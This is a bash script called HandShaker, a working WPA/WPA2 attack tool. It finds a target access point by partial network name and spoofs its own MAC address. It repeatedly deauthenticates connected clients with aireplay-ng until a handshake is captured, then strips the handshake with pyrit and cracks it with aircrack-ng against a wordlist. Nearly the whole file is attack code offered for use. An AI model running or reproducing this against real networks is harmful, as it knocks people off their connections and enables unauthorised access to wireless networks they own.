#!/bin/bash

## HandShaker Copyright 2013, d4rkcat (d4rkc4t@tormail.org)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.


fapscan()																#Determine AP BSSID and channel
{
	clear
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
	$COLOR 2;echo " [*] Scanning for AP's with names like $PARTIALESSID [*] ";$COLOR 9
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat $HOME/tmp-01.csv 2> /dev/null | grep $PARTIALESSID)
			ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -1)
			if [ $ESSID -z ] 2> /dev/null
				then
					DONE=""
			fi
		done
	sleep 0.5
	killall airodump-ng
	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -1)
	CHAN=$((CHAN + 1 - 1))
	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -1 > $HOME/tmp4.csv
	BSSID=$(cat $HOME/tmp4.csv)
	fclientscan
}

fclientscan()															#Find active clients
{
	rm -rf $HOME/tmp* 2> /dev/null
	CNT="0"
	clear
	ESSID=${ESSID:1}
	$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*] "
	echo
	$COLOR 4;echo ' [*] Please wait while I find active clients.. [*] ';$COLOR 9
	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
		done
	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
	echo "$DONE" > $HOME/tmp
	while read LINE
		do
			echo "${LINE:0:17}" >> $HOME/tmp1
		done <$HOME/tmp
	CNT=$(wc -l $HOME/tmp)
	CNT=${CNT:0:2}
	if [ ${CNT:1:1} = " " ] 2> /dev/null
		then
			CNT=${CNT:0:1}
	fi
	fcap
}

fcap()																	#Deauth, capture and strip handshakes
{
	CHKEX="0"
	if [ $CNT = 1 ] 2> /dev/null
		then
			CLIE=$(head -1 $HOME/tmp1)
		else
			$COLOR 2;echo " [*] $CNT active clients found: ";$COLOR 9
			cat $HOME/tmp1
			echo
			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one: ";$COLOR 9 
			read -p "  >" CLIE
	fi
	if [ $CLIE -z ] 2> /dev/null
		then
			CLIE=$(head -1 $HOME/tmp1)
	fi
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			clear
			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
			echo
			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
			echo
			sleep 3
			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
			sleep 2
			DONE=$(pyrit -r $HOME/tmp1-01.cap analyze | grep good)
			sleep 0.5
		done
		
	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
	killall airodump-ng
	clear
	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
	DATE=$( date +%Y_%m_%d_%H%M%S )
	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
	airmon-ng stop mon0
	rm -rf $HOME/tmp*
	clear
	$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you ";$COLOR 9
	echo
	$COLOR 4;echo $DONE;$COLOR 9
	echo
	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4; echo " [>] Do you want to crack now? [Y/n] ";$COLOR 9
			read -p "  >" DOCRK
			case $DOCRK in
				"")fcrack;;
				"Y")fcrack;;
				"y")fcrack;;
				"n")fexit;;
				"N")fexit
			esac
		else
			fcrack
	fi
	fexit
}

fcrack()																#Crack handshakes
{
	clear
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use ";$COLOR 9
			read -e -p "  >" WORDLIST
	fi
	if [ ! -f $WORDLIST ] 2> /dev/null
		then
			$COLOR 1;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
			WORDLIST=""
			sleep 1
			fcrack
		else
			aircrack-ng -w $WORDLIST $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap"
	fi
	fexit
}

fexit()																	#Exit
{
	tput setab 9
	killall aircrack-ng 2> /dev/null
	rm -rf $HOME/tmp* 2> /dev/null
	MOND=$(ifconfig | grep mon0)
	if [ $MOND -z ] 2> /dev/null
		then
			exit
		else
			airmon-ng stop mon0
	fi
	exit
}

fhelp()																	#Help
{
	clear
	echo """ HandShaker - Detect, capture and crack WPA/2 handshakes by partial unique ESSID
	Usage: handshaker x y z
	
			x - Partial unique ESSID (required)
			y - Wireless Interface card
			z - path to wordlist to use for cracking
				
	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt"""
	exit
}



fstart()																#Startup
{
	COLOR="tput setab"
	COLOR2="tput setaf"
	CHKEX=1
	MOND=$(ifconfig | grep mon0)
	mkdir -p $HOME/Desktop/cap
	mkdir -p $HOME/Desktop/cap/handshakes

	if [ $MOND -z ] 2> /dev/null
		then
			clear
			$COLOR 4;echo " [>] Which interface do you want to use?: ";$COLOR 9
			echo
			iwconfig | grep "wlan"
			echo
			read -p "  >wlan" NIC
			NIC="wlan"$NIC
			clear
			airmon-ng start $NIC
			clear
		else
			NIC="mon0"
			clear
	fi
	ifconfig mon0 down
	macchanger -a mon0
	ifconfig mon0 up
	fapscan
}

trap fexit 2

PARTIALESSID="$1"
if [ $3 -z ] 2> /dev/null
	then
		WORDLIST=""
	else
		WORDLIST=$3
fi
if [ ! -z $2 ] 2> /dev/null
	then
		MOND=$(ifconfig | grep mon0)
		if [ $MOND -z ] 2> /dev/null
			then
				airmon-ng start $2
		fi
fi
if [ $# -lt 1 ]
	then
		fhelp
elif [ $1 = "--help" ]
	then
		fhelp
elif [ $1 = "-h" ]
	then
		fhelp
fi

fstart
